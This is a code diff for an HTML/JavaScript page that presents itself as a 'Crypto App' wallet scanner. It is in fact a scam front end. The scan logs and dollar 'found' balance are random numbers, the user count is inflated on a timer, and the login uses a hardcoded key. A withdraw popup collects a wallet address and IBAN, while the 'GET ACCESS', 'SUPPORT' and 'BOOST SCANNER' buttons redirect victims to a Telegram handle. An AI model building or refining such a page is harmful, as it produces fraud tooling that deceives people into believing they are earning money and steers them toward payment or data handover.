@@ -1,47 +1,556 @@
-<div class="top">
-<h1 id="coinName">Bitcoin</h1>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Crypto App</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+-webkit-tap-highlight-color:transparent;
+}
+
+body{
+background:#020617;
+color:white;
+overflow:hidden;
+}
+
+.moneyRain{
+position:fixed;
+inset:0;
+pointer-events:none;
+overflow:hidden;
+opacity:.06;
+}
+
+.moneyRain span{
+position:absolute;
+top:-50px;
+font-size:24px;
+animation:fall 12s linear infinite;
+}
+
+.moneyRain span:nth-child(1){left:10%;animation-delay:0s;}
+.moneyRain span:nth-child(2){left:30%;animation-delay:2s;}
+.moneyRain span:nth-child(3){left:50%;animation-delay:4s;}
+.moneyRain span:nth-child(4){left:70%;animation-delay:1s;}
+.moneyRain span:nth-child(5){left:90%;animation-delay:3s;}
+
+@keyframes fall{
+0%{
+transform:translateY(-100px);
+opacity:0;
+}
+10%{
+opacity:1;
+}
+100%{
+transform:translateY(120vh);
+opacity:0;
+}
+}
+
+.page{
+display:none;
+min-height:100vh;
+padding:18px;
+overflow:auto;
+}
+
+.active{
+display:block;
+}
+
+.center{
+padding-top:50px;
+text-align:center;
+}
+
+.title{
+font-size:34px;
+font-weight:bold;
+}
+
+.sub{
+margin-top:8px;
+opacity:.6;
+font-size:13px;
+}
+
+.users{
+margin-top:18px;
+background:#0f172a;
+padding:12px;
+border-radius:14px;
+border:1px solid #1e293b;
+font-size:13px;
+}
+
+.lang{
+display:flex;
+gap:8px;
+justify-content:center;
+margin-bottom:14px;
+}
+
+.lang button{
+background:#111827;
+border:none;
+color:white;
+padding:8px 14px;
+border-radius:12px;
+}
+
+input{
+width:100%;
+padding:16px;
+margin-top:12px;
+background:#0f172a;
+border:1px solid #1e293b;
+border-radius:18px;
+color:white;
+font-size:14px;
+outline:none;
+}
+
+.loginBtn{
+width:100%;
+padding:16px;
+margin-top:14px;
+border:none;
+border-radius:18px;
+background:#2563eb;
+color:white;
+font-size:14px;
+font-weight:bold;
+}
+
+.error{
+margin-top:12px;
+color:#ef4444;
+display:none;
+font-size:13px;
+}
+
+.boxes{
+display:flex;
+gap:10px;
+margin-top:25px;
+}
+
+.box{
+flex:1;
+background:#0f172a;
+border:1px solid #1e293b;
+padding:20px 10px;
+border-radius:20px;
+font-size:12px;
+text-align:center;
+}
+
+.selectTitle{
+font-size:25px;
+font-weight:bold;
+margin-bottom:20px;
+}
+
+.coin{
+background:#0f172a;
+border:1px solid #1e293b;
+padding:15px;
+border-radius:18px;
+margin-bottom:12px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.left{
+display:flex;
+align-items:center;
+gap:12px;
+}
+
+.logo{
+width:42px;
+height:42px;
+border-radius:50%;
+display:flex;
+justify-content:center;
+align-items:center;
+font-weight:bold;
+}
+
+.btc{background:#f7931a;}
+.eth{background:#627eea;}
+.sol{background:#14f195;color:black;}
+.bnb{background:#f3ba2f;color:black;}
+.xrp{background:#111827;border:1px solid #334155;}
+
+.coin h2{
+font-size:15px;
+}
+
+.coin p{
+font-size:11px;
+opacity:.5;
+margin-top:2px;
+}
+
+.tag{
+background:#2563eb;
+padding:4px 8px;
+border-radius:30px;
+font-size:9px;
+margin-bottom:5px;
+display:inline-block;
+}
+
+.top{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:14px;
+}
+
+.scanTitle{
+font-size:24px;
+font-weight:bold;
+margin-bottom:16px;
+}
+
+.logs{
+height:200px;
+overflow:auto;
+background:#0f172a;
+border:1px solid #1e293b;
+padding:14px;
+border-radius:20px;
+font-size:11px;
+line-height:1.8;
+opacity:.8;
+}
+
+.logs::-webkit-scrollbar{
+display:none;
+}
+
+.found{
+margin-top:16px;
+font-size:28px;
+font-weight:bold;
+}
+
+.green{
+color:#22c55e;
+}
+
+.estimate{
+margin-top:12px;
+background:#111827;
+padding:12px;
+border-radius:16px;
+font-size:12px;
+text-align:center;
+border:1px solid #1e293b;
+}
+
+.boost{
+margin-top:12px;
+background:#111827;
+padding:12px;
+border-radius:16px;
+border:1px solid #334155;
+font-size:12px;
+text-align:center;
+}
+
+.boost span{
+opacity:.6;
+font-size:10px;
+}
+
+.buttons{
+display:flex;
+gap:10px;
+margin-top:16px;
+}
+
+.btn{
+flex:1;
+padding:16px;
+border-radius:18px;
+text-align:center;
+font-size:13px;
+font-weight:bold;
+}
+
+.start{
+background:#172554;
+border:1px solid #1d4ed8;
+}
+
+.withdraw{
+background:#0f172a;
+border:1px solid #334155;
+}
+
+.bottom{
+position:fixed;
+bottom:0;
+left:0;
+width:100%;
+background:#0b1120;
+border-top:1px solid #1e293b;
+padding:12px;
+display:flex;
+justify-content:space-around;
+font-size:11px;
+}
+
+.popup{
+position:fixed;
+top:50%;
+left:50%;
+transform:translate(-50%,-50%);
+background:#0f172a;
+padding:22px;
+border-radius:22px;
+width:88%;
+display:none;
+border:1px solid #334155;
+}
+
+.popup h2{
+margin-bottom:10px;
+}
+
+.popup p{
+font-size:12px;
+opacity:.7;
+line-height:1.6;
+}
+
+.popup button{
+width:100%;
+padding:14px;
+margin-top:12px;
+border:none;
+border-radius:16px;
+background:#2563eb;
+color:white;
+}
+
+.closeBtn{
+background:#111827 !important;
+border:1px solid #334155;
+}
+
+.miniBalance{
+position:absolute;
+top:18px;
+right:18px;
+background:linear-gradient(90deg,#14532d,#22c55e);
+padding:6px 12px;
+border-radius:30px;
+font-size:11px;
+font-weight:bold;
+box-shadow:0 0 14px rgba(34,197,94,.35);
+border:1px solid rgba(255,255,255,.08);
+display:none;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="moneyRain">
+<span>$</span>
+<span>₿</span>
+<span>◆</span>
+<span>◎</span>
+<span>$</span>
 </div>
+
+<div class="page active" id="loginPage">
+
+<div class="center">
+
+<div class="lang">
+<button onclick="setLang('en')">EN</button>
+<button onclick="setLang('tr')">TR</button>
+</div>
+
+<div class="users">
+👤 Total Users:
+<span id="users">17432</span>
+</div>
+
+<div class="title">
+Crypto App
+</div>
+
+<div class="sub">
+Private blockchain wallet access
+</div>
+
+<input id="key" placeholder="Access Key">
+
+<button class="loginBtn" onclick="login()">
+Continue
+</button>
+
+<div class="error" id="error">
+Invalid key
+</div>
+
+<div class="boxes">
+
+<div class="box" onclick="telegram()">
+🔐
+<br><br>
+GET ACCESS
+</div>
+
+<div class="box" onclick="telegram()">
+🛠
+<br><br>
+SUPPORT
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<div class="page" id="selectPage">
+
+<div class="selectTitle">
+Blockchain Networks
+</div>
+
+<div class="coin" onclick="openMiner('Bitcoin')">
+<div class="left">
+<div class="logo btc">₿</div>
+<div>
+<div class="tag">RECOMMENDED</div>
+<h2>Bitcoin</h2>
+<p>High speed chain</p>
+</div>
+</div>
+→
+</div>
+
+<div class="coin" onclick="openMiner('Ethereum')">
+<div class="left">
+<div class="logo eth">◆</div>
+<div>
+<h2>Ethereum</h2>
+<p>Encrypted smart chain</p>
+</div>
+</div>
+→
+</div>
+
+<div class="coin" onclick="openMiner('Solana')">
+<div class="left">
+<div class="logo sol">◎</div>
+<div>
+<div class="tag">POPULAR</div>
+<h2>Solana</h2>
+<p>Fast blockchain network</p>
+</div>
+</div>
+→
+</div>
+
+</div>
+
+<div class="page" id="minerPage">
 
 <div class="miniBalance" id="balanceBox">
 💰 $<span id="balance">0</span>
 </div>
 
-<style>
+<div class="top">
+<h1 id="coinName">Bitcoin</h1>
+</div>
 
-.miniBalance{
+<div class="scanTitle">
+Encrypted Wallet Scanner
+</div>
 
-position:absolute;
+<div class="logs" id="logs"></div>
 
-top:18px;
-right:18px;
+<div class="found">
+Found:
+<span class="green" id="money">$0</span>
+</div>
 
-background:
-linear-gradient(
-90deg,
-#14532d,
-#22c55e
-);
+<div class="estimate">
+• Encrypted node scanning<br>
+• Wallet hash analysis<br>
+• Secure blockchain indexing
+</div>
 
-padding:6px 12px;
+<div class="boost" onclick="telegram()">
+⚡ BOOST SCANNER
+<br>
+<span>
+Contact for premium boost access
+</span>
+</div>
 
-border-radius:30px;
+<div class="buttons">
 
-font-size:11px;
+<div class="btn start" id="scanBtn" onclick="scan()">
+START
+</div>
 
-font-weight:bold;
+<div class="btn withdraw" onclick="popup()">
+WITHDRAW
+</div>
 
-box-shadow:
-0 0 14px rgba(34,197,94,.35);
+</div>
 
-border:1px solid rgba(255,255,255,.08);
+</div>
 
-z-index:10;
+<div class="popup" id="popup">
 
-display:none;
+<h2>
+Withdraw System
+</h2>
 
-}
+<p>
+Wallet verification system
+</p>
 
-</style>
+<input placeholder="Wallet Address">
+<input placeholder="IBAN">
+
+<button onclick="telegram()">
+OPEN SUPPORT
+</button>
+
+<button class="closeBtn" onclick="closePopup()">
+Close
+</button>
+
+</div>
+
+<div class="bottom">
+<div>DASHBOARD</div>
+<div>SEARCH</div>
+<div onclick="telegram()">SUPPORT</div>
+</div>
 
 <script>
 
@@ -49,35 +558,23 @@ let found=0;
 let balance=0;
 let scanning=false;
 let interval;
-let time=90;
 
 function telegram(){
-
-window.location.href=
-"https://t.me/dearmadenn";
-
+window.location.href="https://t.me/dearmadenn";
 }
 
 function login(){
 
-let key=
-document.getElementById("key").value;
+let key=document.getElementById("key").value;
 
 if(key==="dearmaden66"){
 
-document.getElementById("loginPage")
-.classList.remove("active");
-
-document.getElementById("selectPage")
-.classList.add("active");
-
-document.getElementById("balanceBox")
-.style.display="block";
+document.getElementById("loginPage").classList.remove("active");
+document.getElementById("selectPage").classList.add("active");
 
 }else{
 
-document.getElementById("error")
-.style.display="block";
+document.getElementById("error").style.display="block";
 
 }
 
@@ -85,82 +582,43 @@ document.getElementById("error")
 
 function openMiner(name){
 
-document.getElementById("selectPage")
-.classList.remove("active");
+document.getElementById("selectPage").classList.remove("active");
+document.getElementById("minerPage").classList.add("active");
 
-document.getElementById("minerPage")
-.classList.add("active");
+document.getElementById("coinName").innerText=name;
 
-document.getElementById("coinName")
-.innerText=name;
-
-document.getElementById("balanceBox")
-.style.display="block";
+document.getElementById("balanceBox").style.display="block";
 
 }
 
 function scan(){
 
-let logs=
-document.getElementById("logs");
-
-let btn=
-document.getElementById("scanBtn");
+let logs=document.getElementById("logs");
+let btn=document.getElementById("scanBtn");
 
 if(!scanning){
 
 scanning=true;
-
 btn.innerText="STOP";
 
 interval=setInterval(()=>{
 
-let random=
-Math.floor(Math.random()*999999);
+let random=Math.floor(Math.random()*999999);
 
 logs.innerHTML +=
-"[SYSTEM] Wallet #"+random+
-" scanned • encrypted address • no balance found.<br>";
+"[SYSTEM] Wallet #"+random+" scanned • encrypted address • no balance found.<br>";
 
-logs.scrollTop=
-logs.scrollHeight;
+logs.scrollTop=logs.scrollHeight;
 
 if(Math.random()<0.03){
 
-let gain=
-Math.floor(Math.random()*3)+1;
+let gain=Math.floor(Math.random()*3)+1;
 
 found += gain;
-
 balance += gain;
 
-document.getElementById("money")
-.innerText=
-"$"+found;
-
-document.getElementById("balance")
-.innerText=
-balance;
-
-}
-
-if(time>0){
-
-time--;
-
-let min=
-Math.floor(time/60);
-
-let sec=
-time%60;
-
-if(sec<10){
-sec="0"+sec;
-}
-
-document.getElementById("time")
-.innerText=
-"0"+min+":"+sec;
+document.getElementById("money").innerText="$"+found;
+document.getElementById("balance").innerText=balance;
 
 }
 
@@ -169,9 +627,7 @@ document.getElementById("time")
 }else{
 
 scanning=false;
-
 btn.innerText="START";
-
 clearInterval(interval);
 
 }
@@ -179,64 +635,42 @@ clearInterval(interval);
 }
 
 function popup(){
-
-document.getElementById("popup")
-.style.display="block";
-
+document.getElementById("popup").style.display="block";
 }
 
 function closePopup(){
-
-document.getElementById("popup")
-.style.display="none";
-
+document.getElementById("popup").style.display="none";
 }
 
 function setLang(lang){
 
 if(lang==="tr"){
 
-document.querySelector(".sub")
-.innerText=
+document.querySelector(".sub").innerText=
 "Özel blockchain cüzdan erişimi";
 
-document.querySelector(".loginBtn")
-.innerText=
+document.querySelector(".loginBtn").innerText=
 "Devam Et";
 
-document.querySelector(".selectTitle")
-.innerText=
+document.querySelector(".selectTitle").innerText=
 "Blockchain Ağları";
 
-document.querySelector(".scanTitle")
-.innerText=
+document.querySelector(".scanTitle").innerText=
 "Şifrelenmiş Cüzdan Tarayıcı";
-
-document.querySelector(".boost span")
-.innerText=
-"Premium boost erişimi için ulaşın";
 
 }else{
 
-document.querySelector(".sub")
-.innerText=
+document.querySelector(".sub").innerText=
 "Private blockchain wallet access";
 
-document.querySelector(".loginBtn")
-.innerText=
+document.querySelector(".loginBtn").innerText=
 "Continue";
 
-document.querySelector(".selectTitle")
-.innerText=
+document.querySelector(".selectTitle").innerText=
 "Blockchain Networks";
 
-document.querySelector(".scanTitle")
-.innerText=
+document.querySelector(".scanTitle").innerText=
 "Encrypted Wallet Scanner";
-
-document.querySelector(".boost span")
-.innerText=
-"Contact for premium boost access";
 
 }
 
@@ -244,17 +678,15 @@ document.querySelector(".boost span")
 
 setInterval(()=>{
 
-let users=
-parseInt(
-document.getElementById("users").innerText
-);
+let users=parseInt(document.getElementById("users").innerText);
 
-users +=
-Math.floor(Math.random()*2);
+users += Math.floor(Math.random()*2);
 
-document.getElementById("users")
-.innerText=users;
+document.getElementById("users").innerText=users;
 
 },4000);
 
 </script>
+
+</body>
+</html>
